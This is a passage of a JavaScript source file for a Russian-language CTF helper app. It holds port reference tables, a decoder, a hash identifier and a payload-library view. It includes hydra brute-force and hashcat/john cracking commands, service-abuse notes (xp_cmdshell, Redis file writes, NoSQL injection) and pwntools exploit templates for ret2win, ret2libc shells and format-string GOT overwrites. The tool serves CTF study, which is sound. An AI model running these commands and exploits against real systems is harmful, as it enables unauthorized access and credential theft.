    }, 400);
  });

  document.getElementById("notes-copy-btn").addEventListener("click", () => copyText(area.value, document.getElementById("notes-copy-btn")));
  document.getElementById("notes-clear-btn").addEventListener("click", () => {
    if (!area.value.trim() || confirm("Очистить все заметки?")) {
      area.value = "";
      localStorage.removeItem(NOTES_KEY);
      label.textContent = "Очищено";
    }
  });
}

/* ============================================================
   Reference — ports, flag formats, wordlists, magic bytes
   ============================================================ */
const REF_PORTS = [
  {port:21,   proto:"TCP",     service:"FTP",          note:"anonymous login: ftp ip → user: anonymous; brute: hydra -l user -P rockyou.txt ftp://ip"},
  {port:22,   proto:"TCP",     service:"SSH",          note:"brute: hydra -l user -P rockyou.txt ssh://ip; ключи: ~/.ssh/id_rsa"},
  {port:23,   proto:"TCP",     service:"Telnet",       note:"Cleartext. Перехватывается сниффером. brute: hydra"},
  {port:25,   proto:"TCP",     service:"SMTP",         note:"Enum пользователей: VRFY user, EXPN list; relay: sendmail -f from@x to@x < mail.txt"},
  {port:53,   proto:"TCP/UDP", service:"DNS",          note:"Zone transfer: dig axfr @ip domain.com; enum: dnsenum, fierce"},
  {port:79,   proto:"TCP",     service:"Finger",       note:"Enum: finger @ip; finger user@ip"},
  {port:80,   proto:"TCP",     service:"HTTP",         note:"robots.txt, /.well-known/, /backup, /.git/; nikto -h ip; gobuster"},
  {port:110,  proto:"TCP",     service:"POP3",         note:"nc ip 110 → USER admin → PASS pass → LIST → RETR 1"},
  {port:111,  proto:"TCP",     service:"RPC / NFS",    note:"showmount -e ip; mount -t nfs ip:/share /mnt"},
  {port:139,  proto:"TCP",     service:"NetBIOS/SMB",  note:"enum4linux -a ip; smbclient -L //ip"},
  {port:143,  proto:"TCP",     service:"IMAP",         note:"nc ip 143 → a1 LOGIN user pass → a2 LIST"},
  {port:389,  proto:"TCP",     service:"LDAP",         note:`ldapsearch -x -H ldap://ip -b "dc=x,dc=com" -D "" -w ""`},
  {port:443,  proto:"TCP",     service:"HTTPS",        note:"Проверить cert CN/SAN — часто другие домены; sslscan ip"},
  {port:445,  proto:"TCP",     service:"SMB",          note:"smbmap -H ip; crackmapexec smb ip; smbclient //ip/share"},
  {port:873,  proto:"TCP",     service:"rsync",        note:"rsync rsync://ip/; rsync -av rsync://ip/module ./"},
  {port:1433, proto:"TCP",     service:"MSSQL",        note:"sqsh -S ip -U sa; xp_cmdshell 'id'; impacket-mssqlclient user:pass@ip"},
  {port:2049, proto:"TCP",     service:"NFS",          note:"showmount -e ip; mount -t nfs ip:/share /mnt/nfs"},
  {port:3306, proto:"TCP",     service:"MySQL",        note:"mysql -h ip -u root -p; show databases; SELECT @@datadir;"},
  {port:3389, proto:"TCP",     service:"RDP",          note:"xfreerdp /u:user /p:pass /v:ip; rdesktop ip"},
  {port:5432, proto:"TCP",     service:"PostgreSQL",   note:"psql -h ip -U postgres; COPY (SELECT '') TO '/etc/passwd';"},
  {port:5985, proto:"TCP",     service:"WinRM",        note:"evil-winrm -i ip -u user -p pass"},
  {port:6379, proto:"TCP",     service:"Redis",        note:"redis-cli -h ip; CONFIG GET *; KEYS *; CONFIG SET dir /var/www"},
  {port:8080, proto:"TCP",     service:"HTTP-alt",     note:"Tomcat manager: /manager/html (tomcat/tomcat); Jenkins: /script"},
  {port:8443, proto:"TCP",     service:"HTTPS-alt",    note:"Проверить Tomcat, Jenkins, Kubernetes API"},
  {port:9200, proto:"TCP",     service:"Elasticsearch",note:"curl ip:9200/_cat/indices?v; curl ip:9200/_search?q=flag"},
  {port:27017,proto:"TCP",     service:"MongoDB",      note:"mongosh ip:27017; show dbs; NoSQL: {\"\\$ne\":null}"},
];

const REF_FLAGS = [
  {platform:"Generic",       format:"flag{...}",           example:"flag{s0m3_v4lu3}"},
  {platform:"HackTheBox",    format:"HTB{...}",             example:"HTB{h4ck_th3_b0x}"},
  {platform:"TryHackMe",     format:"THM{...}",             example:"THM{try_hack_me}"},
  {platform:"picoCTF",       format:"picoCTF{...}",         example:"picoCTF{c0mput3r_sc13nc3}"},
  {platform:"CTFlearn",      format:"CTFlearn{...}",        example:"CTFlearn{flag_here}"},
  {platform:"NahamCon",      format:"flag{...}",            example:"flag{naham_ctf}"},
  {platform:"CHTB",          format:"CHTB{...}",            example:"CHTB{cyber_apocalypse}"},
  {platform:"pwn.college",   format:"pwn.college{...}",     example:"pwn.college{flag}"},
  {platform:"ImaginaryCTF",  format:"ictf{...}",            example:"ictf{imaginary}"},
  {platform:"DamCTF",        format:"dam{...}",             example:"dam{flag_here}"},
  {platform:"HeroCTF",       format:"Hero{...}",            example:"Hero{h3r0_flag}"},
  {platform:"DCTF",          format:"DCTF{...}",            example:"DCTF{d3fcamp}"},
  {platform:"DEFCON (OOO)",  format:"OOO{...}",             example:"OOO{qualifier_flag}"},
  {platform:"0xL4ugh",       format:"L4ugh{...}",           example:"L4ugh{flag}"},
  {platform:"Sekai CTF",     format:"SEKAI{...}",           example:"SEKAI{flag}"},
];

const REF_WORDLISTS = [
  {path:"/usr/share/wordlists/rockyou.txt",                                                    size:"133 МБ", use:"Пароли, steghide, zip, ssh brute"},
  {path:"/usr/share/wordlists/dirb/common.txt",                                               size:"4.6 КБ", use:"Директории HTTP (быстро, ~4600 слов)"},
  {path:"/usr/share/wordlists/dirb/big.txt",                                                  size:"184 КБ", use:"Директории HTTP (полный список)"},
  {path:"/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",                      size:"1.8 МБ", use:"Директории — стандарт HTB/THM"},
  {path:"/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt",                    size:"1.7 МБ", use:"Файлы (SecLists)"},
  {path:"/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",                   size:"4 КБ",   use:"API endpoints (ffuf -w list -u URL/FUZZ)"},
  {path:"/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",                 size:"50 КБ",  use:"Субдомены (ffuf/subfinder/amass)"},
  {path:"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",               size:"1.1 МБ", use:"Субдомены полный"},
  {path:"/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt", size:"80 КБ", use:"Быстрый перебор паролей"},
  {path:"/usr/share/seclists/Usernames/Names/names.txt",                                     size:"1.6 МБ", use:"Перебор имён пользователей"},
  {path:"/usr/share/john/password.lst",                                                       size:"2.5 МБ", use:"Встроенный список John the Ripper"},
  {path:"/usr/share/metasploit-framework/data/wordlists/unix_users.txt",                     size:"~1 КБ",  use:"Системные пользователи Unix"},
];

const REF_MAGIC = [
  {hex:"7F 45 4C 46",          ext:"ELF, (none)", type:"ELF исполняемый (Linux)"},
  {hex:"4D 5A",                 ext:".exe .dll",   type:"PE исполняемый (Windows)"},
  {hex:"89 50 4E 47 0D 0A 1A 0A",ext:".png",      type:"PNG изображение"},
  {hex:"FF D8 FF",              ext:".jpg .jpeg",  type:"JPEG изображение"},
  {hex:"47 49 46 38",           ext:".gif",        type:"GIF изображение"},
  {hex:"42 4D",                 ext:".bmp",        type:"BMP изображение"},
  {hex:"50 4B 03 04",           ext:".zip .docx",  type:"ZIP архив / Office"},
  {hex:"52 61 72 21 1A 07",     ext:".rar",        type:"RAR архив"},
  {hex:"25 50 44 46",           ext:".pdf",        type:"PDF документ"},
  {hex:"1F 8B",                 ext:".gz .tar.gz", type:"GZIP архив"},
  {hex:"FD 37 7A 58 5A 00",     ext:".xz",         type:"XZ архив"},
  {hex:"37 7A BC AF 27 1C",     ext:".7z",         type:"7-Zip архив"},
  {hex:"CA FE BA BE",           ext:".class",      type:"Java .class файл"},
  {hex:"CF FA ED FE",           ext:"(none)",      type:"Mach-O 64-bit (macOS)"},
  {hex:"53 51 4C 69 74 65",     ext:".db .sqlite3",type:"SQLite база данных"},
  {hex:"D0 CF 11 E0",           ext:".doc .xls",   type:"MS Office (OLE)"},
  {hex:"52 49 46 46",           ext:".wav .avi",   type:"RIFF (WAV/AVI)"},
  {hex:"4F 67 67 53",           ext:".ogg .oga",   type:"OGG аудио/видео"},
  {hex:"49 44 33",              ext:".mp3",        type:"MP3 аудио"},
];

function renderReference() {
  tocEl.style.display = "none";
  const tabs = [
    {id:"ports",    label:"Порты"},
    {id:"flags",    label:"Форматы флагов"},
    {id:"wordlists",label:"Wordlists"},
    {id:"magic",    label:"Magic bytes"},
  ];
  const cur = state.refTab;

  let bodyHTML = "";
  if (cur === "ports") {
    bodyHTML = `<div class="ref-table-wrap"><table class="ref-table">
      <thead><tr><th>Порт</th><th>Протокол</th><th>Сервис</th><th>CTF-заметки</th></tr></thead>
      <tbody>${REF_PORTS.map(p=>`<tr>
        <td><span class="ref-port">${p.port}</span></td>
        <td><span class="ref-proto">${p.proto}</span></td>
        <td><b>${escapeHtml(p.service)}</b></td>
        <td class="ref-note">${escapeHtml(p.note)}</td>
      </tr>`).join("")}</tbody>
    </table></div>`;
  } else if (cur === "flags") {
    bodyHTML = `<div class="ref-table-wrap"><table class="ref-table">
      <thead><tr><th>Платформа</th><th>Формат</th><th>Пример</th></tr></thead>
      <tbody>${REF_FLAGS.map(f=>`<tr>
        <td><b>${escapeHtml(f.platform)}</b></td>
        <td><code class="ref-code">${escapeHtml(f.format)}</code></td>
        <td><code class="ref-code ref-flag-ex">${escapeHtml(f.example)}</code></td>
      </tr>`).join("")}</tbody>
    </table></div>`;
  } else if (cur === "wordlists") {
    bodyHTML = `<div class="ref-table-wrap"><table class="ref-table">
      <thead><tr><th>Путь</th><th>Размер</th><th>Применение</th></tr></thead>
      <tbody>${REF_WORDLISTS.map(w=>`<tr>
        <td><code class="ref-code" style="font-size:11px">${escapeHtml(w.path)}</code></td>
        <td style="white-space:nowrap">${escapeHtml(w.size)}</td>
        <td class="ref-note">${escapeHtml(w.use)}</td>
      </tr>`).join("")}</tbody>
    </table></div>`;
  } else if (cur === "magic") {
    bodyHTML = `<div class="ref-table-wrap"><table class="ref-table">
      <thead><tr><th>Magic bytes (hex)</th><th>Расширение</th><th>Тип файла</th></tr></thead>
      <tbody>${REF_MAGIC.map(m=>`<tr>
        <td><code class="ref-code ref-hex">${escapeHtml(m.hex)}</code></td>
        <td><span class="ref-ext">${escapeHtml(m.ext)}</span></td>
        <td>${escapeHtml(m.type)}</td>
      </tr>`).join("")}</tbody>
    </table></div>`;
  }

  const tabsHTML = tabs.map(t=>`<button class="ref-tab ${t.id===cur?"active":""}" data-tab="${t.id}">${t.label}</button>`).join("");

  content.innerHTML = `
    <div class="page-head" style="margin-bottom:24px">
      <div class="page-eyebrow">Быстрый справочник</div>
      <h1 class="page-title">Справочник</h1>
      <p class="page-desc">Порты, форматы флагов, wordlist-пути и magic bytes — всё в одном месте.</p>
    </div>
    <div class="ref-tabs">${tabsHTML}</div>
    ${bodyHTML}`;

  content.querySelectorAll(".ref-tab").forEach(btn =>
    btn.addEventListener("click", () => { state.refTab = btn.dataset.tab; render(); scrollTop(); }));
}

/* ============================================================
   Decoder / Hash Identifier view
   ============================================================ */
const MORSE = {A:".-",B:"-...",C:"-.-.",D:"-..",E:".",F:"..-.",G:"--.",H:"....",I:"..",J:".---",K:"-.-",L:".-..",M:"--",N:"-.",O:"---",P:".--.",Q:"--.-",R:".-.",S:"...",T:"-",U:"..-",V:"...-",W:".--",X:"-..-",Y:"-.--",Z:"--..",0:"-----",1:".----",2:"..---",3:"...--",4:"....-",5:".....",6:"-....",7:"--...",8:"---..",9:"----.",".":" .-.-.-"," ":"/","/":" ..--.."};
const MORSE_REV = Object.fromEntries(Object.entries(MORSE).map(([k,v])=>[v.trim(),k]));

function decodeMorse(t) {
  return t.trim().split(" / ").map(w=>w.trim().split(" ").map(s=>MORSE_REV[s]||"?").join("")).join(" ");
}
function encodeMorse(t) {
  return t.toUpperCase().split("").map(c=>MORSE[c]||c).join(" ");
}
function decodeOp(text, mode, dir, n) {
  text = text.trim();
  if (!text) return "";
  try {
    switch(mode) {
      case "base64":  return dir==="dec" ? atob(text.replace(/\s/g,"")) : btoa(text);
      case "hex": {
        if (dir==="dec") {
          const clean=text.replace(/[\s:]/g,"");
          let s="";
          for(let i=0;i<clean.length;i+=2) s+=String.fromCharCode(parseInt(clean.slice(i,i+2),16));
          return s;
        } else {
          return Array.from(text).map(c=>c.charCodeAt(0).toString(16).padStart(2,"0")).join(" ");
        }
      }
      case "url":    return dir==="dec" ? decodeURIComponent(text) : encodeURIComponent(text);
      case "rot": {
        const shift=parseInt(n)||13;
        return text.replace(/[A-Za-z]/g,c=>{const b=c<="Z"?65:97;return String.fromCharCode((c.charCodeAt(0)-b+shift)%26+b);});
      }
      case "binary": {
        if (dir==="dec") {
          const clean=text.replace(/\s/g,"");
          let s="";
          for(let i=0;i<clean.length;i+=8) s+=String.fromCharCode(parseInt(clean.slice(i,i+8),2));
          return s;
        } else {
          return Array.from(text).map(c=>c.charCodeAt(0).toString(2).padStart(8,"0")).join(" ");
        }
      }
      case "morse":  return dir==="dec" ? decodeMorse(text) : encodeMorse(text);
      case "html":   return dir==="dec"
        ? text.replace(/&amp;/g,"&").replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,'"').replace(/&#(\d+);/g,(_,n)=>String.fromCharCode(n)).replace(/&#x([0-9a-f]+);/gi,(_,h)=>String.fromCharCode(parseInt(h,16)))
        : text.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
      case "decimal":{
        if (dir==="dec") return text.trim().split(/[\s,]+/).map(n=>String.fromCharCode(parseInt(n))).join("");
        else return Array.from(text).map(c=>c.charCodeAt(0)).join(" ");
      }
      default: return text;
    }
  } catch(e) { return "Ошибка: "+e.message; }
}

function autoDetect(text) {
  const t=text.trim();
  const results=[];
  // base64
  if (/^[A-Za-z0-9+/]+=*$/.test(t.replace(/\s/g,""))&&t.length>=4) {
    try { const d=atob(t.replace(/\s/g,"")); results.push({mode:"base64",label:"Base64",result:d}); } catch{}
  }
  // hex
  const hexClean=t.replace(/[\s:]/g,"");
  if (/^[0-9a-fA-F]+$/.test(hexClean)&&hexClean.length%2===0&&hexClean.length>=4) {
    let s=""; for(let i=0;i<hexClean.length;i+=2) s+=String.fromCharCode(parseInt(hexClean.slice(i,i+2),16));
    if(s.split("").some(c=>c.charCodeAt(0)>=32)) results.push({mode:"hex",label:"Hex",result:s});
  }
  // binary
  const binClean=t.replace(/\s/g,"");
  if (/^[01]+$/.test(binClean)&&binClean.length%8===0&&binClean.length>=8) {
    let s=""; for(let i=0;i<binClean.length;i+=8) s+=String.fromCharCode(parseInt(binClean.slice(i,i+8),2));
    if(s.split("").filter(c=>c.charCodeAt(0)>=32).length>s.length*0.8) results.push({mode:"binary",label:"Binary",result:s});
  }
  // morse
  if (/^[.\-/ ]+$/.test(t)) {
    const d=decodeMorse(t);
    if(d&&!d.includes("?")) results.push({mode:"morse",label:"Morse",result:d});
  }
  // url
  if (/%[0-9a-fA-F]{2}/.test(t)) {
    try { results.push({mode:"url",label:"URL",result:decodeURIComponent(t)}); } catch{}
  }
  // rot13
  const r13=t.replace(/[A-Za-z]/g,c=>{const b=c<="Z"?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);});
  if(r13!==t) results.push({mode:"rot",label:"ROT13",result:r13});
  // decimal
  if (/^[\d\s,]+$/.test(t)&&t.split(/[\s,]+/).length>1) {
    const d=t.trim().split(/[\s,]+/).map(n=>String.fromCharCode(parseInt(n))).join("");
    if(d.split("").filter(c=>c.charCodeAt(0)>=32&&c.charCodeAt(0)<127).length>d.length*0.8) results.push({mode:"decimal",label:"Decimal",result:d});
  }
  return results;
}

const HASHES = [
  {re:/^\$2[ayb]\$[0-9]{2}\$.{53}$/, name:"bcrypt",       hc:"3200",  john:"bcrypt"},
  {re:/^\$1\$.+\$.{22}$/,             name:"MD5-crypt",    hc:"500",   john:"md5crypt"},
  {re:/^\$5\$.+\$.{43}$/,             name:"SHA256-crypt", hc:"7400",  john:"sha256crypt"},
  {re:/^\$6\$.+\$.{86}$/,             name:"SHA512-crypt", hc:"1800",  john:"sha512crypt"},
  {re:/^\$apr1\$.+\$.{22}$/,          name:"APR1-MD5",     hc:"1600",  john:"md5"},
  {re:/^\$P\$[a-zA-Z0-9./]{31}$/,     name:"phpass (WordPress/phpBB)", hc:"400", john:"phpass"},
  {re:/^[0-9a-fA-F]{32}$/,            name:"MD5",          hc:"0",     john:"raw-md5"},
  {re:/^[0-9a-fA-F]{40}$/,            name:"SHA1",         hc:"100",   john:"raw-sha1"},
  {re:/^[0-9a-fA-F]{56}$/,            name:"SHA224",       hc:"1300",  john:"raw-sha224"},
  {re:/^[0-9a-fA-F]{64}$/,            name:"SHA256",       hc:"1400",  john:"raw-sha256"},
  {re:/^[0-9a-fA-F]{96}$/,            name:"SHA384",       hc:"10800", john:"raw-sha384"},
  {re:/^[0-9a-fA-F]{128}$/,           name:"SHA512",       hc:"1700",  john:"raw-sha512"},
  {re:/^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$/, name:"NTLM (возможно)", hc:"1000", john:"nt"},
  {re:/^[0-9a-zA-Z+/]{27}=$/,         name:"Base64 SHA1 (возможно)", hc:"101", john:"dynamic"},
  {re:/^sha1\$[a-zA-Z0-9]+\$.{40}$/,  name:"Django SHA1", hc:"124",   john:"django"},
  {re:/^sha256\$[a-zA-Z0-9]+\$.{64}$/, name:"Django SHA256", hc:"10000", john:"django"},
  {re:/^[0-9a-fA-F]{16}$/,            name:"MySQL323 / DES",hc:"3200", john:"mysql-old"},
  {re:/^\*[0-9a-fA-F]{40}$/,          name:"MySQL5+",      hc:"300",   john:"mysql-sha1"},
];

function identifyHash(h) {
  h=h.trim();
  if (!h) return [];
  return HASHES.filter(({re})=>re.test(h));
}

function renderTools() {
  tocEl.style.display="none";
  const modes=[
    {id:"base64",label:"Base64"},{id:"hex",label:"Hex"},
    {id:"url",label:"URL"},{id:"rot",label:"ROT-N"},
    {id:"binary",label:"Binary"},{id:"morse",label:"Morse"},
    {id:"html",label:"HTML"},{id:"decimal",label:"Decimal"},
  ];
  content.innerHTML=`
    <div class="page-head" style="margin-bottom:28px">
      <div class="page-eyebrow">Утилиты</div>
      <h1 class="page-title">Декодер / Энкодер</h1>
      <p class="page-desc">Мгновенное кодирование и декодирование прямо в браузере — без сторонних сервисов.</p>
    </div>

    <div class="tools-grid">
      <!-- DECODER -->
      <div class="tool-card">
        <div class="tool-card-head">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
          Декодер / Энкодер
        </div>
        <div class="tool-card-body">
          <textarea class="tool-textarea" id="dec-input" placeholder="Вставьте текст для декодирования…" spellcheck="false"></textarea>
          <div class="dec-modes">
            ${modes.map(m=>`<button class="dec-mode-btn ${m.id==="base64"?"active":""}" data-mode="${m.id}">${m.label}</button>`).join("")}
          </div>
          <div class="dec-rot-row hidden" id="dec-rot-row">
            <label class="form-label" style="margin:0">Сдвиг ROT:</label>
            <input class="form-input" id="dec-rot-n" type="number" value="13" min="1" max="25" style="width:70px;padding:5px 8px">
          </div>
          <div class="dec-actions">
            <button class="btn-primary" id="dec-btn">Декодировать</button>
            <button class="btn-cancel" id="enc-btn">Закодировать</button>
            <button class="btn-cancel" id="auto-btn" style="margin-left:auto">Авто-определить</button>
          </div>
          <div id="dec-output-wrap" class="hidden">
            <div class="dec-output-label">Результат</div>
            <div class="tool-result" style="margin:0">
              <div class="tool-result-body"><pre id="dec-output" style="max-height:200px"></pre></div>
            </div>
            <button class="copy-btn" id="dec-copy" type="button" style="margin-top:8px">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              <span>Копировать</span>
            </button>
          </div>
          <div id="auto-output" class="hidden"></div>
        </div>
      </div>

      <!-- HASH IDENTIFIER -->
      <div class="tool-card">
        <div class="tool-card-head">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>
          Идентификатор хешей
        </div>
        <div class="tool-card-body">
          <textarea class="tool-textarea" id="hash-input" placeholder="Вставьте хеш…&#10;e.g. 5d41402abc4b2a76b9719d911017c592" spellcheck="false" style="min-height:80px"></textarea>
          <div class="dec-actions">
            <button class="btn-primary" id="hash-btn">Определить</button>
          </div>
          <div id="hash-output" class="hidden" style="margin-top:14px"></div>
          <div class="hash-info-box">
            <div class="hash-info-title">Популярные форматы</div>
            ${[
              ["32 hex","MD5","0"],["40 hex","SHA1","100"],["64 hex","SHA256","1400"],
              ["128 hex","SHA512","1700"],["$2y$…","bcrypt","3200"],["$6$…","SHA512-crypt","1800"],
            ].map(([len,name,hc])=>`<div class="hash-info-row"><span class="hash-info-len">${len}</span><span class="hash-info-name">${name}</span><span class="hash-info-hc">-m ${hc}</span></div>`).join("")}
          </div>
        </div>
      </div>
    </div>`;

  // wire decoder
  let curMode="base64";
  content.querySelectorAll(".dec-mode-btn").forEach(btn=>{
    btn.addEventListener("click",()=>{
      content.querySelectorAll(".dec-mode-btn").forEach(b=>b.classList.remove("active"));
      btn.classList.add("active");
      curMode=btn.dataset.mode;
      $("#dec-rot-row").classList.toggle("hidden", curMode!=="rot");
    });
  });
  const doOp=(dir)=>{
    const text=$("#dec-input").value;
    const n=$("#dec-rot-n").value;
    const out=decodeOp(text,curMode,dir,n);
    const wrap=$("#dec-output-wrap");
    $("#dec-output").textContent=out;
    wrap.classList.remove("hidden");
    $("#auto-output").classList.add("hidden");
  };
  $("#dec-btn").addEventListener("click",()=>doOp("dec"));
  $("#enc-btn").addEventListener("click",()=>doOp("enc"));
  $("#dec-copy").addEventListener("click",()=>copyText($("#dec-output").textContent,$("#dec-copy")));

  // auto detect
  $("#auto-btn").addEventListener("click",()=>{
    const results=autoDetect($("#dec-input").value);
    const el=$("#auto-output");
    if(!results.length){el.innerHTML=`<div style="color:var(--text-3);font-size:13px;margin-top:12px">Кодировка не определена автоматически.</div>`;el.classList.remove("hidden");return;}
    el.innerHTML=`<div class="dec-output-label" style="margin-top:14px">Авто-определение</div>`+results.map(r=>`
      <div class="tool-result" style="margin-bottom:10px">
        <div class="tool-result-head"><span class="tool-result-name">${r.label}</span></div>
        <div class="tool-result-body"><pre style="max-height:120px">${escapeHtml(r.result.slice(0,500))}</pre></div>
      </div>`).join("");
    el.classList.remove("hidden");
    $("#dec-output-wrap").classList.add("hidden");
  });

  // wire hash
  $("#hash-btn").addEventListener("click",()=>{
    const h=$("#hash-input").value.trim();
    const matches=identifyHash(h);
    const el=$("#hash-output");
    if(!h){el.innerHTML="";el.classList.add("hidden");return;}
    if(!matches.length){
      el.innerHTML=`<div class="hash-unknown">Формат не распознан.<br>Длина: ${h.length} символов${/^[0-9a-fA-F]+$/.test(h)?", только hex-символы":""}</div>`;
    } else {
      el.innerHTML=matches.map(m=>`
        <div class="hash-match">
          <div class="hash-match-name">${m.name}</div>
          <div class="hash-match-meta">
            <span class="hash-chip">hashcat <b>-m ${m.hc}</b></span>
            <span class="hash-chip">john <b>--format=${m.john}</b></span>
          </div>
          <div class="hash-match-cmds">
            <div class="rec-cmd-row"><code class="rec-cmd-code">hashcat -a 0 -m ${m.hc} hash.txt /usr/share/wordlists/rockyou.txt</code><button class="rec-cmd-copy" data-cmd="hashcat -a 0 -m ${m.hc} hash.txt /usr/share/wordlists/rockyou.txt">copy</button></div>
            <div class="rec-cmd-row"><code class="rec-cmd-code">john --format=${m.john} --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code><button class="rec-cmd-copy" data-cmd="john --format=${m.john} --wordlist=/usr/share/wordlists/rockyou.txt hash.txt">copy</button></div>
          </div>
        </div>`).join("");
    }
    el.classList.remove("hidden");
    el.querySelectorAll(".rec-cmd-copy").forEach(b=>b.addEventListener("click",()=>{copyText(b.dataset.cmd,b);b.textContent="✓";setTimeout(()=>b.textContent="copy",1500);}));
  });
}

/* ============================================================
   Payload library view
   ============================================================ */
function renderPayloads() {
  tocEl.style.display="none";
  const cats=ctfData.payloadCategories;
  const cur=state.payloadCat||cats[0].id;
  const payloads=ctfData.payloads.filter(p=>p.catId===cur);
  const cat=cats.find(c=>c.id===cur);

  const subNav=cats.map(c=>`
    <button class="payload-nav-btn ${c.id===cur?"active":""}" data-cat="${c.id}">
      <span class="payload-nav-ico">${c.icon}</span>${c.title}
    </button>`).join("");

  const cards=payloads.map(p=>`
    <div class="payload-card">
      <div class="payload-card-head">
        <span class="payload-card-title">${escapeHtml(p.title)}</span>
      </div>
      <p class="payload-card-desc">${escapeHtml(p.desc)}</p>
      <div class="code">
        <div class="code-bar">
          <span class="label">payload</span>
          <button class="copy-btn payload-copy" type="button" data-payload="${escapeHtml(p.payload)}">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            <span>Копировать</span>
          </button>
        </div>
        <pre><code>${escapeHtml(p.payload)}</code></pre>
      </div>
      ${p.note?`<div class="payload-note"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:13px;height:13px;flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><span>${escapeHtml(p.note)}</span></div>`:""}
    </div>`).join("");

  content.innerHTML=`
    <div class="crumb"><a data-home>Обзор</a>
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
      <span class="here">Пейлоады</span></div>
    <div class="page-head">
      <div class="page-eyebrow">Библиотека пейлоадов</div>
      <h1 class="page-title">${cat.title}</h1>
      <p class="page-desc">${cat.desc}</p>
    </div>
    <div class="payload-subnav">${subNav}</div>
    <div class="payload-grid">${cards||"<div class='empty' style='display:flex'><h3>Нет пейлоадов</h3></div>"}</div>`;

  content.querySelectorAll("[data-home]").forEach(a=>a.addEventListener("click",goHome));
  content.querySelectorAll(".payload-nav-btn").forEach(btn=>{
    btn.addEventListener("click",()=>{state.payloadCat=btn.dataset.cat;render();scrollTop();});
  });
  content.querySelectorAll(".payload-copy").forEach(btn=>{
    btn.addEventListener("click",()=>copyText(btn.dataset.payload,btn));
  });
}

/* ============================================================
   Template generator (accordion in PWN / Crypto categories)
   ============================================================ */
const TEMPLATES = {
  pwn_ret2win:`from pwn import *

elf = ELF('./binary', checksec=False)
context.binary = elf
# context.log_level = 'debug'

p = process('./binary')
# p = remote('host', 1337)

# ─── Find offset ───────────────────────────────────────────
# Run: cyclic 200 | ./binary  →  cyclic -l <rsp value>
OFFSET = 0  # TODO

# ─── Find win function address ──────────────────────────────
# objdump -d ./binary | grep -i 'win\\|flag\\|shell'
WIN = elf.sym['win']  # TODO: replace with actual function name

# ─── Payload ────────────────────────────────────────────────
payload  = b'A' * OFFSET
payload += p64(WIN)

p.sendlineafter(b'> ', payload)
p.interactive()`,

  pwn_ret2libc:`from pwn import *

elf  = ELF('./binary', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # adjust path
context.binary = elf

p = process('./binary')
# p = remote('host', 1337)

OFFSET = 0  # TODO: find with cyclic

# ─── ROP gadgets ─────────────────────────────────────────────
# ROPgadget --binary ./binary | grep 'pop rdi'
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]          # stack alignment

# ─── Stage 1: leak libc base ─────────────────────────────────
payload  = b'A' * OFFSET
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])   # return to main for stage 2

p.sendlineafter(b'> ', payload)
leaked   = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc_base = leaked - libc.sym['puts']
log.success(f'libc @ {hex(libc_base)}')

libc.address = libc_base

# ─── Stage 2: system("/bin/sh") ──────────────────────────────
bin_sh  = next(libc.search(b'/bin/sh'))
payload  = b'A' * OFFSET
payload += p64(ret)                  # alignment
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(libc.sym['system'])

p.sendlineafter(b'> ', payload)
p.interactive()`,

  pwn_fmt:`from pwn import *

elf = ELF('./binary', checksec=False)
context.binary = elf

p = process('./binary')
# p = remote('host', 1337)

# ─── Find format string offset ───────────────────────────────
# Send: AAAA.%1$p.%2$p.%3$p...  until you see 0x41414141
# FMT_OFFSET = position where your input appears on stack
FMT_OFFSET = 0  # TODO

# ─── Leak canary / libc ─────────────────────────────────────
p.sendlineafter(b'> ', f'%{FMT_OFFSET}$p'.encode())
leak = int(p.recvline().strip(), 16)
log.info(f'leak: {hex(leak)}')

# ─── Arbitrary write: overwrite GOT / return address ─────────
# from pwn import fmtstr_payload
target_addr  = elf.got['exit']   # TODO
target_value = elf.sym['win']    # TODO
payload = fmtstr_payload(FMT_OFFSET, {target_addr: target_value})

p.sendlineafter(b'> ', payload)
p.interactive()`,

  crypto_rsa:`from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse
from math import gcd

